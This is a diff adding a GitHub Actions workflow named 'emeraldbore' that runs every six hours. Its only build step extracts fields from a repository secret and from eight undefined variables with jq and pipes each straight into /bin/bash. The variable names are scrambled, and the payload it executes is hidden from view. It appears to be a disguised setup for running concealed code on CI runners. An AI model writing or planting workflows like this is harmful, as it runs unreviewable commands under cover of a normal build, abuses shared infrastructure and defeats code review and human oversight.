@@ -1,0 +1,26 @@
+name: emeraldbore
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '8 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: emeraldbore
+        env:
+          qu37: ${{ secrets.qu37 }}
+        run: |
+          echo $qu37 | jq -r .k42 | /bin/bash
+          echo $m406 | jq -r .rumvs3 | /bin/bash
+          echo $q33 | jq -r .sqhw6015 | /bin/bash
+          echo $omkg1 | jq -r .ik0 | /bin/bash
+          echo $iw5728 | jq -r .m7036 | /bin/bash
+          echo $cfv45 | jq -r .w28 | /bin/bash
+          echo $a30315 | jq -r .zw00786 | /bin/bash
+          echo $zs5168 | jq -r .botv8675 | /bin/bash
+          echo $evt69 | jq -r .nx3184 | /bin/bash
+
